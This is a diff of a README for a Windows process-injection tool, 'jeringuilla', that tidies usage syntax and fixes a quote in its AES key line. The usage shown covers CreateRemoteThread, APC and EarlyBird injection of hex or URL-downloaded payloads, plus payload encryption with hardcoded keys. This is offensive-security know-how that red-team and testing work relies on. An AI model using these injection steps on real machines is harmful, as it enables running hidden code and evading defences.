@@ -16,7 +16,7 @@ Tool for easy process injection. It implements several types of process injectio
 Option "list" to enumerate all processes or filter by name or owner:
 
 ```
-jeringuilla.exe list [ all | PROCESS_NAME | PROCESS_OWNER]
+jeringuilla.exe list [ all | PROCESS_NAME | PROCESS_OWNER ]
 ```
 
 Example - List all processes:
@@ -40,7 +40,7 @@ jeringuilla.exe list "DESKTOP-MA54241\ricardo"
 You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.
 
 ```
-jeringuilla.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]
+jeringuilla.exe inject-crt [ (PROCESS_NAME PROCESS_OWNER) | PROCESS_PID ]  [ HEXADECIMAL_PAYLOAD | URL ]
 ```
 
 Example - Injection using process name, process owner and payload in HEX format:
@@ -67,7 +67,7 @@ You can use the process name and owner, or the PID. The payload can be in HEX fo
 For this one you must wait until the thread enters in alertable state, you can try it using Notepad and the option "Save as".
 
 ```
-jeringuilla.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]
+jeringuilla.exe inject-apc [ (PROCESS_NAME PROCESS_OWNER) | PROCESS_PID ] [ HEXADECIMAL_PAYLOAD | URL]
 ```
 
 Example - Injection using process name, process owner and payload in HEX format:
@@ -90,7 +90,7 @@ jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin
 You only set the program path. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.
 
 ```
-jeringuilla.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]
+jeringuilla.exe earlybird PROGRAM_PATH [ HEXADECIMAL_PAYLOAD | URL ]
 ```
 
 Example - Injection using program path and payload in HEX format:
@@ -134,7 +134,7 @@ Both the HEX and RAW payloads in previous examples can be encrypted using AES wi
 To change the AES password and IV you must update these variables in both jeringuilla and payloadEncryptor code:
 
 ```
-static String payload_aes_password = "ricardojoserf123ricardojoserf123
+static String payload_aes_password = "ricardojoserf123ricardojoserf123";
 static String payload_aes_iv = "jeringa1jeringa1";
 ``` 
 
